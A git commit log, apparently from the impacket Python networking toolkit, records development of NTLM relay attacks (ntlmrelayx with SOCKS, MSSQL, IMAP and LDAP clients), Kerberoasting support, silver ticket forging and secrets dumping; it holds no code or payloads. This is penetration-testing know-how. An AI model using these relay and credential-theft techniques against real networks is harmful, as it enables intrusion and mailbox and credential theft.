commit 98171acbd72e250b7ac1def6f1d720bfc58f0776
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 19 10:12:23 2017 -0500

    Not needed anymore

commit b19efbc0672164a23d8e100c24c7d46e941defa0
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 18 21:43:10 2017 -0500

    TargetsProcessor refactoring
    
    - We're now using urlparse. Fits perfectly for what we want to do.
    
         Format of targets are based in URI syntax
             scheme://netloc/path
         where:
             scheme: the protocol to target (e.g. 'smb', 'mssql', 'all')
             netloc: int the form of domain\username@host:port (domain\username and port are optional, and don't forget
                     to escape the '\')
             path: only used by specific attacks (e.g. HTTP attack).
    
         Some examples:
    
             smb://1.1.1.1: It will target host 1.1.1.1 (protocol SMB) with any user connecting
             mssql://contoso.com\joe@10.1.1.1: It will target host 10.1.1.1 (protocol MSSQL) only when contoso.com\joe is
             connecting.

commit 4f39f8688f8c3520e0cca508b725d91c8cdefc74
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 17 02:43:16 2017 -0300

    Cleaning unused switches. When SOCKS is not selected, there's no need for MiniShell

commit 7e4a6b54beaa73b82c57ce9c51b4339b2eb99633
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 17 00:18:26 2017 -0300

    Code cleanup and better organization
    
    - Also adjusting username parameter in attacks functions

commit 1395430f599ce08b1f6811bd7c61f47465a3ff48
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 16 23:58:01 2017 -0300

    Fix for Unicode decoding

commit 7f0247ad265c56c51bd031467bd02bf4486f8212
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 16 23:57:22 2017 -0300

    Code cleanup and better organization
    
    - There's more stuff to improve tho.

commit 38c37b2c73c433d0a78a0dc6e29f01598c042493
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 15 18:47:38 2017 -0300

    Adding activeConnectionsWatcher thread and improving Minishell
    
    - Now you can list the active relayed sessions using the socks command. E.g.:
    ntlmrelayx> socks
    Target          Username                            Port
    --------------  ----------------------------------  ----
    192.168.48.230  CONTOSO/ADMINISTRATOR               1433
    192.168.48.230  VULNERABLE/ADMINISTRATOR            1433
    192.168.48.230  VULNERABLE.CONTOSO.COM/NORMALUSER2  1433

commit c328de54bb405b79f6ed54b977fc511d31f59a2d
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 13 18:48:23 2017 -0300

    Adding a skeleton MiniShell and Flask WebService
    
    - Currently both do nothing, although now you can type exit and ntlmrelayx will exit gracefully.

commit 154bc570379bb6bd34e3cdbda1713b678803a7c1
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 12 12:34:17 2017 -0300

    Fix formatted print error

commit de8c875537a25de6a08b5226a0fe78773abcf05a
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 12 10:28:37 2017 -0300

    Support for SQL Authentication support coming from clients

commit 886aa110a0ef6a755fd143862f5f6d7c94925958
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 10 19:30:13 2017 -0300

    Relay refactoring - Phase IX
    
    - Adding MSSQL SOCKS Plugin. It is now working using mssqlclient.py as the client. Testing needed with other clients
    - Windows Authentication is the only mode supported at the moment.

commit 924f659400cbd01be4f9c84819f9724d49589127
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 7 23:58:49 2017 -0300

    Forgot to commit also this file.
    
    Same description as previous commit

commit 2040d31e45e8a407a2a320cdc3c938f446887a4f
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 7 23:57:07 2017 -0300

    Adding sessionData to ProtocolClients
    
    - Needed for the SOCKS plugins later on to do their jobs. Protocol Clients should store valuable data that the SOCKS plugin will later use. Example, the NTLM CHALLENGE from the target.. or the TDS response after a successful login
    - Commented all the section where Extended security is not negotiated. This is not being used at the moment, and don't know what clients still support that

commit ebb5508eb4dd65e78ea21bcdf9172c97fc553dca
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 6 19:52:21 2017 -0300

    Fixed client session passing to IMAP Attack module
    
    - Tested and working for downloading victim's inbox
    - In any case.. hopefully there will be a socks proxy for IMAP soon.

commit d2736eff91b2411b0748ab54381134460b594f65
Author: Ramzeth <ramzeth@gmail.com>
Date:   Wed Dec 6 18:04:18 2017 +0300

    Update secretsdump.py

commit 6df3275fd1960fdf40ae0aaed37d92bf8b456161
Author: Ramzeth <ramzeth@gmail.com>
Date:   Wed Dec 6 17:59:12 2017 +0300

    OldVal parameter dump added to LSA secrets dump

commit be0117abaaf384070b4b25312283d34bed5952dd
Author: Eyal Mamo <eyal@cymmetria.com>
Date:   Wed Dec 6 10:09:40 2017 +0200

    Replace socket.send() with socket.sendall()

commit 596e006f62d698e1b0ce0638f1defe53647d8051
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 4 12:51:37 2017 -0300

    If getKerberosTGS fails, print the SPN that is failing along with the error

commit a28bd6a643ff7bda7039f84611dcbbc12f978b21
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 4 10:16:51 2017 -0300

    Relay refactoring - Phase VIII
    
    - Added HTTP/S Protocol Clients
    - The attack for this protocol now only downloads the root page. We should send the requested page as a command line switch (instead of being included in the target).
    - Minor changes to other clients

commit 8b3ccf92cbe4a4517adf8f53c57cddf948a3b88a
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 2 01:41:36 2017 -0300

    Simplifying Relay Servers
    
    - Now Relay Servers are Protocol Clients agnostic. No need to specify the protocols supported. You add a new Protocol Client and then the relay server will use them if requested by the user.
    - We should do the same thing for the attacks (although SOCKS is the way to go). The relay servers should only relay connections with the help of the Protocol Clients.

commit cd53cd528795ccb1a9360db9b478d0108254adec
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 2 01:24:57 2017 -0300

    Relay refactoring - Phase VII
    
    - IMAP and IMAPS Protocol Clients implemented. Still testing is needed (installing Exchange now)
    - LDAPS Protocol Client added
    - Added PROTOCOL_CLIENT_CLASSES set as a way to define multiple plugin classes in the same file.
    - Supressed and simplified some logging so the output is more readable

commit 1335449dfae7281dd80d4538e48b1f73c95fbb68
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 21:31:12 2017 -0300

    Relay refactoring - Phase VI
    
    - LDAPRelayClient ported to ProtocolClient. Authentication is successful although further attacks are not working (maybe by LDAP setup).
    - Fixed changes in other Protocol Clients when closing connections.

commit 135de38e4ae312b2344428ccee8d71d399765a6b
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:29:58 2017 -0300

    Adding documentation and removing unused imports

commit 24be3b8b57cf625daf18ac43166f91eb2b9d1392
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:22:13 2017 -0300

    Fixing SMB->MSSQL
    
    - I wasn't extracting it from the SPNEGO struct. This needs to be reviewed after finishing the Protocol Clients (whether it comes with SPNEGO wrapper)

commit faf5cfb6391b465e1d19bac34534bf9bacca8e78
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:13:42 2017 -0300

    Fixed typo

commit 128bb1802bfae0825e72763825515f5647800cd8
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:04:29 2017 -0300

    Relay refactoring - Phase V
    
    - MSSQLClient ported to ProtocolClient base class. HTTP->MSSQL works well, but SMB->MSSQL does not. I'm not sure it wasn't working before. Checking.
    - Added getStandardSecurityChallenge() to ProtocolClient base class. This is needed when standard security is used by the client (old clients eg. WinXP)

commit f37454710f1677df29883cc224d2be1a2c199a74
Author: Matan Hart <me@matanhart.com>
Date:   Thu Nov 30 19:21:31 2017 +0200

    Few changes to create accurate service ticket
    
    Changed some flags to suit service tickets (inspired by mimikatz).

commit 1bdf64412f7fcd0cfe35fda2694c4cccaa8633a7
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 30 10:24:46 2017 -0300

    Fixed kerberos authentication with hashes
    
    - Slightly different approach from the one proposed at https://github.com/CoreSecurity/impacket/pull/356
    - Also, doing the same for etype.
    - Should be compatible with pyasn1 >= 0.2.3

commit 2dfca058894892849387576a2e60073f9cf0200b
Author: Matan Hart <me@matanhart.com>
Date:   Wed Nov 29 15:41:00 2017 +0200

    Implemented silver ticket creation in ticketer.py
    
    Added few changes I forgot to put from the initial commit

commit 3e1a74921f506f51951bfeb1309a10b0722b56d7
Merge: ab50b5a4 ed60110a
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 28 13:06:37 2017 -0300

    Merge branch 'patch-1' of https://github.com/MrAnde7son/impacket

commit 3a2dc9cd4099b942b29aa378ae23dc0a63f64813
Author: Matan Hart <me@matanhart.com>
Date:   Tue Nov 28 15:20:38 2017 +0200

    Implemented silver ticket creation in ticketer.py
    
    Noticed that TGS/Silver Ticket forging in ticketer.py is still in ToDo.
    Added optional -spn flag to support service ticket signing.

commit ab50b5a42c03bac830fdaf381fdcc225270b5221
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 27 19:41:41 2017 -0300

    Adjusting if statement to make it compatible with different pyasn1 versions

commit 49a3c8e553bd8e0699d532634d55486aca0ca585
Merge: 3d88b768 43b25fe6
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 26 11:33:31 2017 -0300

    Merge branch 'Kanda-Motohiro-kanda-spnego-fix'

commit 43b25fe6185ec6482d53808785c47cb707abf0ac
Author: motohiro kanda <kanda.motohiro@gmail.com>
Date:   Sat Nov 25 11:17:09 2017 +0900

    Fixed NegTokenResp generates invalid SupportedMech and NegResult.
    
    spnego.NegTokenResp.fromString has simple typos and generates
    packet without SupportedMech and with invalid NegResult value.

commit 3d88b7682a758f876ad9b747f9925507f55b201a
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 23 19:59:30 2017 -0300

    Adding backward compatibility till pyasn-0.2.3 (at least) + supporting 0.4.2

commit b021dac4b2e268d45c127a76815843ccc569585d
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 23 16:02:24 2017 -0300

    First version of requirements.txt

commit c001138f76075e602f16f7ac143bcb409f1dfef2
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 23 15:40:18 2017 -0300

    Small changes to make it compatible with pyasn1-0.3.7.
    
    - IMPORTANT: This is not backward compatible with old pyasn1 versions. Be sure you run 0.3.7.

commit d1fdeb5264900be2fd4c7364bb9ad7abc53d4185
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 22 17:38:01 2017 -0300

    Pad not needed in AsciiStructure + calculate PadLen when parsing structure
    
    - Addresses https://github.com/CoreSecurity/impacket/issues/350 and https://github.com/CoreSecurity/impacket/issues/348

commit 5861d727ec3150b7c57db9cb7902eb5c7ccb4113
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 15 17:45:37 2017 -0300

    Relay refactoring - Phase IV
    
    - Samba tools now working thru SOCKS proxy with SMB2+ protocol

commit a3eb1ee64d0ad74a8049da71e6ce60c5962842ee
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 15 11:14:21 2017 -0300

    SMB_COM_SESSION_SETUP_ANDX alignment is only needed for UnicodeStructure
    
    - Thanks @tsela85 for pointing it out.
    - Should address https://github.com/CoreSecurity/impacket/issues/342

commit 28f7c8a7cf46a2baaa38d6ec153840ffe03f05ab
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 14 15:39:21 2017 -0300

    Fixing wrong alignment in SMB_COM_SESSION_SETUP_ANDX response
    
    - It was not showing NativeOS/NativeLanMan fields correctly under Wireshark
    - Should fix https://github.com/CoreSecurity/impacket/issues/342

commit cd56a9543392e36da12e47d0cca7e3732c2a6cb5
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 12 16:54:27 2017 -0300

    Relay refactoring - Phase III
    
    - SMB2 Server working, now relay from SMB2+ clients work. In short, HTTP->SMB1/2+ and SMB1/2+->SMB1/2+ working.
    - SMB1/2+ SOCKS proxy working, although SAMBA clients still refuses to use it. Impacket tools work (e.g. proxychains secretsdump).
    - A lot of code cleanup, now should port the other Protocol Clients to the new plugin structure.

commit e20490ff9c14be7a9180136be147955b8d5e0df5
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 10 18:22:48 2017 -0300

    Relay refactoring - Phase II
    
    - SOCKS SMB2 support should work now, although SAMBA suite does not, looks like even if you specify not check signatures, it still does. More research needed. Impacket tools work.
    - ntlmrelayx works on SMBv1 by default, if you want SMB2 specify -smb2support

commit ece6bab611ae4f1ec45079ed58d7904b488bb3cd
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 10 11:38:13 2017 -0300

    Relay refactoring - Phase I
    
    - Adding support for SMBv2 for relay clients (done). Still pending accepting SMBv2+ connections from the server
    - Adding Protocol Client Plugins. Each protocol client (e.g. SMB, MSSQL, IMAP) should use the ProtocolClient base class and adhere to its methods. Protocol Clients are loaded dinamically when ntlmrelayx is started.
    - Relay Servers should be agnostic of the protocol clients supported (right now only working for SMB Protocol Clients, the rest are broken)
    - Had to expose negotiateSessionWildcard in smbconnection in order to do nego for SMB versions (I don't like exposing this)
    - SMB SOCKS pluing still working only for SMBv1 connections.
    
    Pretty unstable as of right now but going to the right direction. SMBv2 works :)

commit ed60110ad210413ff999299bc076fde8ed6db56a
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Nov 5 18:36:59 2017 +0200

    Subnet Functions
    
    Implemented DhcpEnumSubnets, DhcpGetSubnetInfo, DhcpGetOptionValue, DhcpEnumOptionValues, DhcpEnumAllOptionValues, DhcpEnumOptionValuesV5.
    plus all relevant structures and helper functions.

commit 3a94845ae5f4a70d885d8ae4e6d85a66c675312e
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 24 19:40:04 2017 -0300

    Avoid having duplicate connections against the same target/port/username (socks mode)

commit 1a2195354d832c20b01aae3c897ebc7e2492c677
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 24 19:14:43 2017 -0300

    Adding -debug switch
    
    * Useful for all I'm working on.
    * Might also be useful to you ;)

commit 35f539d53bdff4762ccc84d85a774c5885f9d659
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:41:48 2017 -0400

    Finishing gracefully when hitting CTRL-C

commit 20a0821fe135d0c76934e4f4865996b04b5d9d3a
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:40:33 2017 -0400

    Minor clarifications in the initial documentation
    
    * Mainly to differentiate it from smbrelayx.py

commit 41232fdee182a953fe23ade2b50cfd61aafff748
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:39:58 2017 -0400

    Adding SOCKS support for HTTP->SMB scenario
    
    * Already added to ntlmrelayx.py, forgot to add that here in the first place

commit b54c0dc5491fa94d0e871e9d405155e40a6e63e6
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:38:25 2017 -0400

    Adding SOCKS support to ntlmrelayx.py
    
    * For now, it works only against smb:// targets
    * Supported both for SMB/HTTP servers

commit d800e42b81a48b70ab151c8e07209ef8785a05cd
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 15 20:10:30 2017 -0400

    Adding even6 test cases

commit 76600282e674b14c4a78ac73a05ac0eb066d5988
Merge: f1900082 3800dc1e
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 15 20:09:04 2017 -0400

    Merge branch 'elitest-DES-Kerberoast'

commit 3800dc1e50b13a11191b74b7c2fd460b4dc790ad
Author: Jim Shaver <dcyherd@gmail.com>
Date:   Thu Oct 12 11:14:22 2017 -0500

    Added support for DES Kerberoast

commit 8729e1a6d8d96d4bb48313e6107ce51b0e1aaf02
Merge: f1900082 39ec8cbf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 11 09:48:45 2017 -0300

    Merge pull request #333 from franferrax/master
    
    Trivial TypeError issue while LOG formatting

commit 39ec8cbf1e9164eda10de57bfbb71d7a6f5dd767
Author: fferrari <fferrari@coresecurity.com>
Date:   Tue Oct 10 19:26:46 2017 -0300

    Little LOG formatting bug fixed.

commit f19000821e94cbafa4c8c8eb20d4e879023af43e
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 9 14:30:45 2017 -0300

    Adding AES as a possible cipher for TLS session.
    
    * In case RC4 is not present
    * Should address #269, needs checking
    * Has been also reported in #332

commit ddcc3e39029686f956554f646415ea571cb3b491
Merge: 4b7453fb 4cf3b071
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 26 10:50:15 2017 -0300

    Merge branch 'elitest-Kerberoast-AES-final'

commit 4cf3b07141c3d68e83ae6bf4ef18e79979997f06
Merge: 4b7453fb 9943cf1a
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 26 10:49:40 2017 -0300

    Merge branch 'Kerberoast-AES-final' of https://github.com/elitest/impacket into elitest-Kerberoast-AES-final

commit 4b7453fb25f48053ac5351371d8813c33e9ea16e
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 22 11:33:20 2017 -0300

    Adding AES(128) support for SAM hashes decryption
    
    - Similar to what was done in the past for the encryptedPekList in the offline NTDS.
    - Thanks @gentilkiwi for documenting the structures, way easier and elegant approach.
    - Testing needed in all platforms, just to be sure backward compatibility works.
    - Addresses https://github.com/CoreSecurity/impacket/issues/326

commit ec0324a37bc3b42f740c49877c4407d28bf58f1e
Merge: b852457d e7c83ec4
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 18 11:19:38 2017 -0300

    Merge branch 'symeonp-master'

commit e7c83ec431f01486f9f89d3aa306df2286b0d730
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 18 11:17:11 2017 -0300

    If serviceName is not specified, default to empty string.
    
    * This will force the class to generate a random string.
    * And mantains backward compatibility for those scripts that are not specifying a serviceName (e.g. goldenPac, smbrelayx) preventing them to break functionality.

commit 21edeca04f8f5e8bfc86bb9bea55bb9952f418be
Author: Symeon <simospar@gmail.com>
Date:   Mon Sep 18 10:47:10 2017 +0100

    Bug fix: Make psexec service start manual
    
    Add also a "-service-name" parameter where a user can name the service.

commit b852457d298f058a416ba2fcb89dd29f4819c617
Author: asolino <bethus@gmail.com>
Date:   Sat Sep 16 11:20:27 2017 -0300

    If stdout is redirected, default to UTF-8 encoding
    
    * This was preventing using tee or redirect output to a file
    * Reported by @tlathm in https://github.com/CoreSecurity/impacket/issues/319

commit 859317dfffcb1cbca904c73aba40a22d6b3fadd0
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 16:32:59 2017 -0300

    Do not logoff when the login didn't work
    
    * It would raise USER_SESSION_DELETED and break this script functionality.

commit 314b4ebfd311b1ec04de47333ea873827e80b1fb
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 16:06:17 2017 -0300

    Clarifications when receiving ERROR_DS_NAME_ERROR_NOT_UNIQUE
    
    * Might help users how to get over this issue.
    * If somebody knows how to avoid this from happening ping me.

commit faf2344ca97ad095ab529a885b1700c1b879b44c
Merge: 8e8651e4 a1194194
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:19:54 2017 -0300

    Merge branch 'MrAnde7son-patch-2'

commit a11941947c9b238a56a0c0a76a56504ccede6088
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:18:35 2017 -0300

    Adjusting test cases to new [MS-EVEN6] structure
    
    * Adding tests for helper functions as well. Some implemented functions still need test cases

commit 03e7dcae86fa864c683581764df4712170d1ca88
Merge: 8e8651e4 6c2f0cd6
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:17:49 2017 -0300

    Merge branch 'patch-2' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-2

commit 8e8651e42452066eab0def2a0a618717e0b6a223
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:06:10 2017 -0300

    Not needed anymore

commit b33a4484db9401205ef616d0bad497ec310751a9
Merge: e2e5be8b 32b0adac
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:03:27 2017 -0300

    Merge branch 'MrAnde7son-patch-1'

commit 32b0adacdd4731885cb9a659d1d46907aa7926ea
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:59:40 2017 -0300

    Some minor cosmetic changes
    
    1. Adding copyright and description
    2. Changing the UUID to match the [MS-EVEN6] standard
    3. Optimized imports

commit 8c5c122063aaea80ffadc7d023bc326049f42e0d
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:55:38 2017 -0300

    Renaming this interface source code name so it matches the standard [MS-EVEN6]

commit ce5ae5a625257e8adbd05e77abe30048fad05e7e
Merge: e2e5be8b 3d602b0c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:42:10 2017 -0300

    Merge branch 'patch-1' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-1

commit e2e5be8b78f76d96dc15042af834aaab293c8dd0
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:39:19 2017 -0300

    Better support of Kerberos tests

commit 9cc4d39582e263dde23b5c9870630c7338913e47
Merge: babb63e7 dbc38254
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 15 11:17:48 2017 -0300

    Merge pull request #317 from contactr2m/master
    
    Workaround for #236

commit 6c2f0cd6bc388c9e89b2dac521447803435b27fc
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Thu Sep 14 22:27:11 2017 +0300

    test case for EVEN6 interface

commit babb63e79ab19de28926946f4b2b81e2e44c4dc6
Merge: 8824999c 8c8f2988
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 12 18:32:06 2017 -0300

    Merge pull request #313 from CoreSecurity/relay-experimental
    
    Relay experimental

commit 9943cf1af94009158c9f6ed251991cfaacdd40d2
Author: Jim Shaver <dcypherd@gmail.com>
Date:   Sun Sep 10 18:15:27 2017 -0500

    Added support for AES Kerberoast tickets

commit 8824999c10d886be57401f7885039d54fc5a1e8a
Merge: 509ca7a9 441afa72
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 31 12:57:43 2017 -0300

    Merge pull request #311 from federicoemartinez/wmiexec-exitcode
    
    returncode set to 1 when there is an error

commit 441afa723fc84854a7ed1995987018cc5b1e2021
Author: Federico Martinez <federicoemartinez@gmail.com>
Date:   Thu Aug 31 12:25:18 2017 -0300

    returncode set to 1 when there is an error
    
    If the connection fails, the exitcode is now set to 1. The behavior for KeyboardInterrupt is still only logging.

commit 509ca7a913dbf37fb01ed8bd374579e3fc1f8047
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 30 16:31:08 2017 -0300

    Decode the CONTROL_PAGEDRESULTS class in order to extract the Cookie
    
    With previous pyasn1 versions (e.g. 0.2.3), this was automatically done by means of
    overridding the __class__ variable (check Control.setComponentByPosition()) when a Control object was decoded.
    Although not the cleanest approach, it's been working so far.
    
    With newer pyasn1 versions (e.g. 0.3.3) is it not possible to override the __class__ variable anymore,
    so we need to come up with a solution when it comes the time of using a paged search control.
    For now, I'm decoding the Control() instance into a KNOWN_CONTROLS[CONTROL_PAGEDRESULTS].
    I say for now, because I'm not convinced of encoding/decoding again something that hopefully could've been solved
    before in the execution path, but this is what I came up with. There's a performance penalty that I'd like to avoid.
    
    Maybe @kacpern can improve this code ;)

commit 7e4e228df13611a3f53a0d0ce7575efff8d204cb
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 30 14:25:34 2017 -0300

    Adding pyasn1 exception when checking salt values
    
    * Aiming at being compatible with latest pyasn1 versions

commit 3d602b0c02ae5e0bdc127fe77855ee291b0c28d2
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Tue Aug 29 12:15:40 2017 +0300

    Create eventlog.py

commit 3e0938ef281ccecd9e20bf02bd038d7cd2c19f69
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 15 17:54:16 2017 -0300

    Improved support for Unicode Strings inside and ENCODED_STRING value
    
    * In those cases where a list of items was parsed, there were some inconsistencies
    * Should address https://github.com/CoreSecurity/impacket/issues/304
    * Further testing is needed to be sure we're not breaking anything else.

commit 23be93ed82733e11761dc0bb850e51e744310ba1
Merge: 049f2831 8fd81d80
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Aug 14 11:52:06 2017 -0300

    Merge pull request #303 from machosec/patch-3
    
    Support Global Catalog authentication

commit 8fd81d80ad39287a85390c8966a24ec3e04e3a66
Author: Matan Hart <matan.hart@cyberark.com>
Date:   Mon Aug 14 17:40:23 2017 +0300

    Added Global Catalog support
    
    Small addition to query the global catalog (port 3268) instead of LDAP.

commit 049f2831f5e911926aa23d8e0e9b171770d97f16
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 11 14:27:01 2017 -0300

    Matching output with rpcdump.py

commit 85c6fc7c497d1072809c0b90d9bb8da9591fe5a7
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 10 20:30:42 2017 -0300

    Forgot to check we support SMB3 Encryption
    
    * Done a while ago here https://github.com/CoreSecurity/impacket/commit/32ec8ab90fff2717ebeef33bdb25b1ada49b8315

commit 9325006d90d0e7b1a929b130bb32984ac26a1028
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 7 15:53:04 2017 -0300

    Making output a little bit nicer
    
    * Instead of printing the UUID tuple, I break it down in UUID and version

commit 1a3beb60f211740ee1f66b0374ed8e5f0c713d42
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 7 11:07:33 2017 -0300

    Changing Service Creation flags
    
    * Following @ldionmarcil advise (https://github.com/byt3bl33d3r/CrackMapExec/pull/197) to avoid issues with multiple server's reboot in those cases where the service couldn't be deleted for some reason.

commit 56f7f584a65e87eb783cce370fd1b9191e30b495
Merge: 1f433b3a 400ae3b4
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 7 10:42:42 2017 -0300

    Merge branch 'machosec-patch-1'

commit 400ae3b43ef18768b09cdd71c1bd132193d057f0
Author: Matan Hart <matan.hart@cyberark.com>
Date:   Mon Aug 7 16:27:27 2017 +0300

    Adding SD Flags Control
    
    Implementation of the LDAP_SERVER_SD_FLAGS_OID (https://msdn.microsoft.com/en-us/library/cc223733.aspx).
    I wrote this code because by default querying the NtSecurityDescriptor attribute in Active Directory requires Domain Admin privileges. The reason for that is that AD attempts to retrieve all parts of the SD which contains the SACL (System ACL) that can be accessed only by DA privileges. When this happens AD decides to simply not return anything. To get around the limitation above and still query the NtSecurityDescriptor I specified the LDAP controls to exclude the retrieval of SACL.
    This control can also go along with the "SimplePagedResultsControl" control.

commit 1f433b3ab6598a62f47cbcee256e3a7fe7519eaf
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 2 12:31:11 2017 -0300

    Fix errors found after merging https://github.com/CoreSecurity/impacket/pull/300

commit 82758c4f731b560beb7362cc1ec868517242b370
Merge: 87407534 d4a6215a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 2 12:24:44 2017 -0300

    Merge pull request #300 from MrAnde7son/patch-1
    
    R_DhcpEnumSubnetClientsV4 and R_DhcpEnumSubnetClientsVQ

commit 87407534d86ffeee7e71829a2b16f0ff7082d918
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 2 12:21:11 2017 -0300

    Removing typo in test case

commit d4a6215aad192ebc3aac1367a93210f3297542e8
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Aug 2 18:09:30 2017 +0300

    Update dhcpm.py

commit ad2ffef67c2ff97e326ea7cd7dcc1556cf8d4656
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Aug 2 10:27:45 2017 +0300

    R_DhcpEnumSubnetClientsV4 and R_DhcpEnumSubnetClientsVQ
    
    Added these two. I'm sure some will find it useful :)

commit 8c8f2988d72c271bb6ef46cb016f32ed731f88ab
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 29 02:57:43 2017 -0300

    Not needed anymore

commit dd2d14baaa33bf6be517e3679e8301d815d74715
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 29 02:51:44 2017 -0300

    Removing debug messages

commit 5c64e6c81e0a56d898aa05c6f89196aebeca3143
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 29 02:39:38 2017 -0300

    Adding plugin support for SOCKS functionality
    
    - There a base class called SocksRelay that should be used as base class for SOCKS protocol plugins
    - Any new plugin should be added to the impacket/examples/ntlmrelayx/servers/socksplugins directory
    - These plugins will be automatically loaded when the SOCKS proxy is loaded.
    - The idea is to add SockRelay plugins for any protocol we want (e.g. MSSQL, LDAP, HTTP, etc)
    - Lots of testing needed.

commit c87c3711c08b7483f03d27dc82937ec4a0080a64
Merge: cf14e7cd 71dae115
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 19 18:33:07 2017 -0300

    Merge branch 'ropnop-domain_sids'

commit 71dae11519e2f6c4a1b354230ab649da064ddc41
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Tue Jul 18 17:11:33 2017 -0500

    changed option name to reflect more than just users

commit b04f2cb6d75f12d3ac5100b0bbbbff62532d097d
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Tue Jul 18 17:57:29 2017 -0500

    added no-pass and domain-users options

commit cf14e7cd777ae41e7469fd892836912a03977552
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 14 17:52:39 2017 -0300

    Clarifications in the script's comments

commit 65f34550ed4a75f309a4db88151c6109a5afeee9
Merge: a1523f32 0ae4ab01
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 14 17:51:36 2017 -0300

    Merge branch 'ropnop-ldapchanges'

commit 0ae4ab014796ccb5f02b4db62ace308787a79cd7
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Fri Jul 14 12:47:06 2017 -0500

    added command line switch '-all-users'

commit 59b99e76c0b608c6d1d47f0a835c46b67af88aa2
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Thu Jul 13 16:22:45 2017 -0500

    removed email=* filter, added objectCategory filter)

commit a1523f32ee852b4925bb814e29d1d2a56cc9e438
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 7 12:07:13 2017 -0300

    Not needed anymore

commit d7630a8f7f392f46538d853a2c8e66bb09f48b7a
Merge: d285faf2 16478813
